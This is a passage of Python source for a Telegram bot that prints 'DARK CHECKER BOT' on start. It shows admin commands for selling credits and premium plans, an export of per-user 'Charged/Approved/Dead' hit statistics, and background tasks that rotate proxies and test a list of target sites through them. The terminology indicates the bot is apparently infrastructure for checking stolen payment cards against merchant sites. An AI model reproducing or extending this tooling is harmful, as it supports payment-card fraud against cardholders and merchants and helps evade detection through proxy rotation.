@bot.on(events.NewMessage(pattern=r'^/checkcredits(@\w+)?(\s+)?'))
async def checkcredits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/checkcredits user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    credits = get_user_credits(target_id)
    plan_name = get_user_plan_name(target_id)
    
    await event.reply(f"<b>💰 User Credits</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_name}\n💰 Credits: {credits}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/setcredits(@\w+)?(\s+)?'))
async def setcredits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/setcredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply("❌ Invalid user_id or amount", parse_mode='html')
    
    credits_data = load_credits()
    credits_data[str(target_id)] = amount
    save_credits(credits_data)
    
    await event.reply(f"✅ <b>Credits Set!</b>\n\n👤 User: <code>{target_id}</code>\n💰 New Balance: {amount}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/exportstats(@\w+)?(?:\s|$)'))
async def exportstats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    hit_data = load_hit_stats()
    if not hit_data:
        return await event.reply("❌ No hit data available.", parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"hit_stats_export_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("HIT STATISTICS EXPORT\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")
        
        for uid, stats in sorted(hit_data.items(), key=lambda x: x[1].get('charged', 0), reverse=True):
            f.write(f"User: {uid}\n")
            f.write(f"  Charged: {stats.get('charged', 0)}\n")
            f.write(f"  Approved: {stats.get('approved', 0)}\n")
            f.write(f"  Dead: {stats.get('dead', 0)}\n")
            f.write(f"  Total: {stats.get('total', 0)}\n")
            f.write("-" * 40 + "\n")
    
    await event.reply("✅ <b>Stats Exported!</b>", file=filename, parse_mode='html')
    
    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/activecheck(@\w+)?(?:\s|$)'))
async def activecheck_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not active_sessions:
        return await event.reply("ℹ️ No active checking sessions right now.", parse_mode='html')
    
    text = f"<b>🔄 Active Checking Sessions ({len(active_sessions)})</b>\n<b>─────────────────────</b>\n\n"
    
    for sid, sdata in active_sessions.items():
        status = sdata.get('status', 'unknown')
        uid = sdata.get('user_id', 'unknown')
        emoji = "⏸️" if status == 'paused' else "▶️"
        text += f"<blockquote>{emoji} User: <code>{uid}</code> — Status: {status}</blockquote>\n"
    
    await event.reply(text, parse_mode='html')

# ========== MAIN ==========
async def main():
    print("=" * 50)
    print("DARK CHECKER BOT STARTING...")
    print("=" * 50)
    
    await resolve_chat_ids()
    
    # Start background tasks
    asyncio.create_task(cleanup_expired_users())
    asyncio.create_task(auto_check_proxies())
    asyncio.create_task(auto_check_sites())
    
    print("Bot is running...")
    print("=" * 50)
    
    await bot.run_until_disconnected()

# ========== BACKGROUND TASKS ==========
async def cleanup_expired_users():
    while True:
        try:
            premium_data = load_premium_users()
            expired = []
            for uid, data in premium_data.items():
                try:
                    expiry = datetime.fromisoformat(data['expiry'])
                    if datetime.now() > expiry:
                        expired.append(uid)
                except:
                    expired.append(uid)
            
            if expired:
                for uid in expired:
                    del premium_data[uid]
                save_premium_users(premium_data)
                print(f"Cleaned up {len(expired)} expired premium users")
        except Exception as e:
            print(f"Cleanup error: {e}")
        
        await asyncio.sleep(3600)  # Run every hour

async def auto_check_proxies():
    while True:
        await asyncio.sleep(7200)  # Every 2 hours
        try:
            proxies = load_proxies()
            if not proxies:
                continue
            
            print(f"Auto-checking {len(proxies)} proxies...")
            alive = []
            dead = []
            
            for i in range(0, len(proxies), 10):
                batch = proxies[i:i+10]
                tasks = [test_proxy(p) for p in batch]
                results = await asyncio.gather(*tasks)
                for res in results:
                    if res['status'] == 'alive':
                        alive.append(res['proxy'])
                    else:
                        dead.append(res['proxy'])
            
            async with aiofiles.open(PROXY_FILE, 'w') as f:
                for p in alive:
                    await f.write(f"{p}\n")
            
            print(f"Auto proxy check: {len(alive)} alive, {len(dead)} removed")
        except Exception as e:
            print(f"Auto proxy check error: {e}")

async def auto_check_sites():
    while True:
        await asyncio.sleep(10800)  # Every 3 hours
        try:
            sites = load_sites()
            if not sites:
                continue
            
            proxies = load_proxies()
            if not proxies:
                continue
            
            print(f"Auto-checking {len(sites)} sites...")
            alive = []
            dead = []
            
            for i in range(0, len(sites), 10):
                batch = sites[i:i+10]
                fresh_proxies = load_proxies()
                if not fresh_proxies:
                    fresh_proxies = proxies
                tasks = [test_site(s, random.choice(fresh_proxies)) for s in batch]
                results = await asyncio.gather(*tasks)
                for res in results:
                    if res['status'] == 'alive':
                        alive.append(res['site'])
                    else:
                        dead.append(res['site'])
            
            async with aiofiles.open(SITES_FILE, 'w') as f:
                for s in alive:
                    await f.write(f"{s}\n")
            
            print(f"Auto site check: {len(alive)} alive, {len(dead)} removed")
        except Exception as e:
            print(f"Auto site check error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
